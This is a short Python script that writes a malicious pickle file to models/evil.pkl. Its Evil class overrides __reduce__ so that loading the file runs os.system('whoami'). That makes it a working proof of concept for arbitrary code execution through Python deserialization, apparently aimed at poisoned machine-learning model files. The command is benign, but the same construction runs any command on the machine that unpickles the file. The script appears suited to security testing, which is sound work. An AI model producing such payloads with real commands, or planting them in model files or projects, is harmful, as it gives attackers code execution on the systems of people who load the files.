import pickle
import os

class Evil:
    def __reduce__(self):
        return (os.system, ("whoami",))

with open("models/evil.pkl", "wb") as f:
    pickle.dump(Evil(), f)

print("evil.pkl created")